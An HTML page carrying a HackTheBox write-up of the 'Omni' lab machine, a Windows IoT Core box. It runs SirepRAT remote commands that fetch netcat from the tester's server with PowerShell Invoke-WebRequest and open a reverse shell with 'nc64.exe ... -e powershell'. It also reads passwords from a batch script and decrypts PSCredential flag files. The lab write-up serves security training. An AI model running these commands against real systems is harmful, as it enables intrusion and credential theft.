<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Omni | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Omni HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/omni/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/omni/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Omni "><meta property="og:description" content="Omni HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/omni/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/omni/omni.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-31T18:01:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/omni/omni.png"><meta name=twitter:title content="Omni "><meta name=twitter:description content="Omni HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Omni ","item":"https://s4ch.github.io/writeups/hackthebox/omni/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Omni ","name":"Omni ","description":"Omni HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Omni Profile: www.hackthebox.eu Difficulty: Easy OS: Other Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n1 2 $ pacman -S nmap windows-binaries $ pikaur -S powershell-bin Network enumeration Port \u0026 service discovery scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Nmap 7.80 scan initiated Tue Oct 13 20:58:56 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.204 Nmap scan report for 10.10.10.204 Host is up (0.023s latency). Not shown: 65529 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 29817/tcp open unknown 29819/tcp open arcserve ARCserve Discovery 29820/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port29820-TCP:V=7.80%I=7%D=10/13%Time=5F85F960%P=x86_64-unknown-linux-g SF:nu%r(NULL,10,\"\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\")%r(GenericLine SF:s,10,\"\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\")%r(Help,10,\"\\*LY\\xa5\\x SF:fb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\")%r(JavaRMI,10,\"\\*LY\\xa5\\xfb`\\x04G\\xa9m SF:\\x1c\\xc9}\\xc8O\\x12\"); Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 13 21:01:54 2020 -- 1 IP address (1 host up) scanned in 177.87 seconds At first glance this looks like a classic Windows, but remember the box type is not Windows but other.\nOn port 8080, look at the Basic Auth realm: Windows Device Portal.\nThe Windows Device Portal is often used for Windows 10 IoT.\nHTTP discovery We can try the default Windows 10 IoT Dashboard credentials on the Windows Device Portal but this doesn’t work.\n1 2 Username: `Administrator` Password: `p@ssw0rd` Vulnerability search Let’s search for Windows IoT Core vulnerabilities.\nNew exploit lets attackers take control of Windows IoT Core devices Windows IoT Core exploitable via ethernet Windows 10 IoT Core Test Interface Lets Attackers Take Over Devices SafeBreach Labs Discloses New Microsoft Windows IoT Core Weakness and Exploit We can also read the Windows IoT Core: RCE as System PDF paper from SafeBreach.\nThey also produced a tool to exploit the vulnerability called SirepRAT.\nExploitation: RCE Let’s install a virtual python environment to avoid messing with our system libraries when installing the dependencies of the tool. Also even if the tool was released in 2019 the author (dorazouri) had the bad idea to develop in with the long time deprecated python 2. So let’s install a deprecated python 2 environment.\n1 2 3 4 $ asdf install python 2.7.18 $ asdf local python 2.7.18 $ asdf current python python 2.7.18 /home/cyfun/CTF/HackTheBox/machines/Omni/.tool-versions 1 2 3 $ git clone https://github.com/SafeBreach-Labs/SirepRAT.git $ cd SirepRAT $ pip2 install -r requirements.txt Because we are in the virtual environment, our default python is now the deprecated python 2 instead of python 3.\n1 2 $ python --version Python 2.7.18 So we can now executed the tool:\n1 2 3 4 $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\hostname.exe\" \u003cHResultResult | type: 1, payload length: 4, HResult: 0x0\u003e \u003cOutputStreamResult | type: 11, payload length: 6, payload peek: 'omni'\u003e \u003cErrorStreamResult | type: 12, payload length: 4, payload peek: ''\u003e The RCE works, we retrieved the hostname.\nDeploying a reverse shell We can’t use classis LOLBAS like certutils for downloading but we can still use powershell.\nWe can use one of those three methods:\nInvoke-WebRequest System.Net.WebClient Start-BitsTransfer So let’s use Invoke-WebRequest to download a binary served by our one-line ruby HTTP server:\n1 2 3 4 $ ruby -run -ehttpd /usr/share/windows/windows-binaries/ -p9999 [2020-10-13 22:46:52] INFO WEBrick 1.6.0 [2020-10-13 22:46:52] INFO ruby 2.7.2 (2020-10-01) [x86_64-linux] [2020-10-13 22:46:52] INFO WEBrick::HTTPServer#start: pid=53742 port=9999 PS: It’s no use to try a meterpreter or any MSF reverse shell are they will be a good chance that Windows Defender will block it since we’re on Windows 10. So let’s use ncat instead.\n1 2 $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c powershell Invoke-Webrequest -OutFile C:\\Windows\\temp\\ncat.exe -Uri http://10.10.14.173:9999/ncat.exe\" \u003cHResultResult | type: 1, payload length: 4, HResult: 0x0\u003e Launching the ncat I had a compatibility error. Let’s check the architecture:\n1 2 3 4 $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args ' /c powershell $env:PROCESSOR_ARCHITECTURE' \u003cHResultResult | type: 1, payload length: 4, HResult: 0x0\u003e \u003cOutputStreamResult | type: 11, payload length: 7, payload peek: 'AMD64'\u003e \u003cErrorStreamResult | type: 12, payload length: 4, payload peek: ''\u003e I haven’t found any pre-compiled version of ncat for Windows 64 bits so I downloaded a 64 bits version of netcat (nc).\nSo I uploaded the 64 bits version the same way and executed it:\n1 $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c C:\\Windows\\temp\\nc64.exe 10.10.14.173 9999 -e powershell\" I was able to receive the reverse shell:\n1 2 3 4 5 6 7 8 $ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.204:49689 (family 2/IPv4, TCP) Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\windows\\system32\u003e Privilege Escalation : stage 1 We are logged as omni and we can list other accounts available:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PS C:\\windows\\system32\u003e echo $env:UserName omni$ PS C:\\windows\\system32\u003e ls C:\\Data\\Users Directory: C:\\Data\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/4/2020 9:48 PM administrator d----- 7/4/2020 9:53 PM app d----- 7/3/2020 11:22 PM DefaultAccount d----- 7/3/2020 11:22 PM DevToolsUser d-r--- 10/13/2020 12:08 PM Public d----- 7/4/2020 10:29 PM System Let’s browse their directories:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 PS C:\\windows\\system32\u003e gc C:\\Data\\Users\\app\\user.txt System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential flag 01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e800000000200002 0000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7 PS C:\\windows\\system32\u003e gc C:\\Data\\Users\\administrator\\root.txt System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential flag 01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7 PS C:\\windows\\system32\u003e gc C:\\Data\\Users\\app\\iot-admin.xml gc C:\\Data\\Users\\app\\iot-admin.xml System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential omni\\administrator 01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27 We got the flags but they are encrypted in PSCredential objects.\nI seems we will be bale to decrypt them with Import-Clixml to Import a secure credential object.\nPowershell Password Encryption \u0026 Decryption How To Save and Read Sensitive Data with PowerShell But to do that we’ll need to be logged as the target user or at least know their credentials.\nSystem enumeration with Powershell Rather than using the long options of get-childitem, I wanted to use the short aliases, so here is a command I found on StackOverflow to list the parameter aliases:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 PS /home/cyfun\u003e Get-Command get-childitem | \u003e\u003e ForEach-Object {$_.parameters | \u003e\u003e ForEach-Object { $_.Values | \u003e\u003e Where-Object { \u003e\u003e $_.Aliases.Count -gt 0 } | \u003e\u003e Select-Object Name, Aliases \u003e\u003e } \u003e\u003e } Name Aliases ---- ------- LiteralPath {PSPath, LP} Recurse {s} Verbose {vb} Debug {db} ErrorAction {ea} WarningAction {wa} InformationAction {infa} ErrorVariable {ev} WarningVariable {wv} InformationVariable {iv} OutVariable {ov} OutBuffer {ob} PipelineVariable {pv} Directory {ad, d} File {af} Hidden {ah, h} ReadOnly {ar} System {as} Here is the long and the short way to write a recursive find equivalent for Windows in Powershell:\n1 2 $ Get-ChildItem -Path c:\\ -Recurse -ErrorAction SilentlyContinue -Force -Filter *.vbs $ gci -Path c:\\ -s -ea SilentlyContinue -Force -Filter *.vbs Found no interesting VBS scripts, so let’s find bat scripts instead.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ gci -Path c:\\ -s -ea SilentlyContinue -Force -Filter *.bat Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-h-- 8/21/2020 12:56 PM 247 r.bat Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/26/2018 11:36 PM 744 Build.bat Directory: C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\bin Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/26/2018 11:36 PM 925 Pester.bat There are some promising scripts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 PS C:\\windows\\system32\u003e gc 'C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat' @echo off :LOOP for /F \"skip=6\" %%i in ('net localgroup \"administrators\"') do net localgroup \"administrators\" %%i /delete net user app mesh5143 net user administrator _1nt3rn37ofTh1nGz ping -n 3 127.0.0.1 cls GOTO :LOOP :EXIT Here we are we obtained the credentials of the users.\nPrivilege Escalation : stage 2 It no use to break our brain cells trying some “runas” commands. We can use those credentials over the device portal (http://10.10.10.204:8080).\nThen in the Process menu, there is a Run Command sub-menu.\nWhen trying to run C:\\Windows\\temp\\nc64.exe 10.10.14.173 8888 -e powershell we have an access denied.\nSo let’s try the decrypt command directly\n1 2 3 powershell $credential = Import-CliXml -Path U:\\Users\\app\\user.txt; $credential.GetNetworkCredential().Password 7cfd50f6bc34db3204898f1505ad9d70 Now let’s do the same with the admin account.\n1 2 3 powershell $credential = Import-CliXml -Path U:\\Users\\administrator\\root.txt; $credential.GetNetworkCredential().Password 5dbdce5569e2c4708617c0ce6e9bf11d ","wordCount":"1530","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/omni/omni.png","datePublished":"2021-01-31T18:01:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/omni/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Omni</h1><div class=post-description>Omni HackTheBox writeup</div><div class=post-meta><span title='2021-01-31 18:01:00 +0000 UTC'>January 31, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1530 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/omni/omni.png alt="Omni HackTheBox Machine"><p>Omni - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#vulnerability-search>Vulnerability search</a></li><li><a href=#exploitation-rce>Exploitation: RCE</a></li><li><a href=#deploying-a-reverse-shell>Deploying a reverse shell</a></li><li><a href=#privilege-escalation--stage-1>Privilege Escalation : stage 1</a></li><li><a href=#system-enumeration-with-powershell>System enumeration with Powershell</a></li><li><a href=#privilege-escalation--stage-2>Privilege Escalation : stage 2</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Omni</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/271>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Other</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pacman -S nmap windows-binaries
</span></span><span class=line><span class=cl>$ pikaur -S powershell-bin
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Tue Oct 13 20:58:56 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.204
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.204
</span></span><span class=line><span class=cl>Host is up (0.023s latency).
</span></span><span class=line><span class=cl>Not shown: 65529 filtered ports
</span></span><span class=line><span class=cl>PORT      STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>135/tcp   open  msrpc    Microsoft Windows RPC
</span></span><span class=line><span class=cl>5985/tcp  open  upnp     Microsoft IIS httpd
</span></span><span class=line><span class=cl>8080/tcp  open  upnp     Microsoft IIS httpd
</span></span><span class=line><span class=cl>| http-auth:
</span></span><span class=line><span class=cl>| HTTP/1.1 401 Unauthorized\x0D
</span></span><span class=line><span class=cl>|_  Basic realm=Windows Device Portal
</span></span><span class=line><span class=cl>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl>|_http-title: Site doesn&#39;t have a title.
</span></span><span class=line><span class=cl>29817/tcp open  unknown
</span></span><span class=line><span class=cl>29819/tcp open  arcserve ARCserve Discovery
</span></span><span class=line><span class=cl>29820/tcp open  unknown
</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port29820-TCP:V=7.80%I=7%D=10/13%Time=5F85F960%P=x86_64-unknown-linux-g
</span></span><span class=line><span class=cl>SF:nu%r(NULL,10,&#34;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;)%r(GenericLine
</span></span><span class=line><span class=cl>SF:s,10,&#34;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;)%r(Help,10,&#34;\*LY\xa5\x
</span></span><span class=line><span class=cl>SF:fb`\x04G\xa9m\x1c\xc9}\xc8O\x12&#34;)%r(JavaRMI,10,&#34;\*LY\xa5\xfb`\x04G\xa9m
</span></span><span class=line><span class=cl>SF:\x1c\xc9}\xc8O\x12&#34;);
</span></span><span class=line><span class=cl>Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Tue Oct 13 21:01:54 2020 -- 1 IP address (1 host up) scanned in 177.87 seconds
</span></span></code></pre></td></tr></table></div></div><p>At first glance this looks like a classic Windows, but remember the box type
is not <em>Windows</em> but <em>other</em>.</p><p>On port 8080, look at the Basic Auth realm: <em>Windows Device Portal</em>.</p><p>The <a href=https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal>Windows Device Portal</a>
is often used for <em>Windows 10 IoT</em>.</p><h2 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h2><p>We can try the default <a href=https://docs.microsoft.com/en-us/windows/iot-core/connect-your-device/iotdashboard>Windows 10 IoT Dashboard</a> credentials on the <a href=https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal>Windows Device Portal</a>
but this doesn&rsquo;t work.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>Username</span><span class=p>:</span><span class=w> </span><span class=o>`</span><span class=n>Administrator</span><span class=o>`</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Password</span><span class=p>:</span><span class=w> </span><span class=o>`</span><span class=n>p</span><span class=o>@</span><span class=n>ssw0rd</span><span class=o>`</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=vulnerability-search>Vulnerability search<a hidden class=anchor aria-hidden=true href=#vulnerability-search>#</a></h2><p>Let&rsquo;s search for Windows IoT Core vulnerabilities.</p><ul><li><a href=https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/>New exploit lets attackers take control of Windows IoT Core devices</a></li><li><a href=https://nakedsecurity.sophos.com/2019/03/05/windows-iot-exploit-permits-directly-connected-device-pwnage/>Windows IoT Core exploitable via ethernet</a></li><li><a href=https://www.bleepingcomputer.com/news/security/windows-10-iot-core-test-interface-lets-attackers-take-over-devices/>Windows 10 IoT Core Test Interface Lets Attackers Take Over Devices</a></li><li><a href=https://safebreach.com/Post/SafeBreach-Labs-Discloses-New-Microsoft-Windows-IoT-Core-Weakness-and-Exploit>SafeBreach Labs Discloses New Microsoft Windows IoT Core Weakness and Exploit</a></li></ul><p>We can also read the <a href=https://github.com/SafeBreach-Labs/SirepRAT/blob/master/docs/SirepRAT_RCE_as_SYSTEM_on_Windows_IoT_Core_White_Paper.pdf>Windows IoT Core: RCE as System</a> PDF paper from SafeBreach.</p><p>They also produced a tool to exploit the vulnerability called <a href=https://github.com/SafeBreach-Labs/SirepRAT>SirepRAT</a>.</p><h2 id=exploitation-rce>Exploitation: RCE<a hidden class=anchor aria-hidden=true href=#exploitation-rce>#</a></h2><p>Let&rsquo;s install a virtual python environment to avoid messing with our system
libraries when installing the dependencies of the tool.
Also even if the tool was released in 2019 the author (dorazouri) had the bad
idea to develop in with the long time deprecated python 2. So let&rsquo;s install
a deprecated python 2 environment.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>asdf</span> <span class=n>install</span> <span class=n>python</span> <span class=mf>2.7</span><span class=o>.</span><span class=mi>18</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>asdf</span> <span class=n>local</span> <span class=n>python</span> <span class=mf>2.7</span><span class=o>.</span><span class=mi>18</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>asdf</span> <span class=n>current</span> <span class=n>python</span>
</span></span><span class=line><span class=cl><span class=n>python</span>          <span class=mf>2.7</span><span class=o>.</span><span class=mi>18</span>           <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>HackTheBox</span><span class=o>/</span><span class=n>machines</span><span class=o>/</span><span class=n>Omni</span><span class=o>/.</span><span class=k>tool</span><span class=o>-</span><span class=n>versions</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ git clone https://github.com/SafeBreach-Labs/SirepRAT.git
</span></span><span class=line><span class=cl>$ cd SirepRAT
</span></span><span class=line><span class=cl>$ pip2 install -r requirements.txt
</span></span></code></pre></td></tr></table></div></div><p>Because we are in the virtual environment, our default python is now the deprecated
python 2 instead of python 3.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ python --version
</span></span><span class=line><span class=cl>Python 2.7.18
</span></span></code></pre></td></tr></table></div></div><p>So we can now executed the tool:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
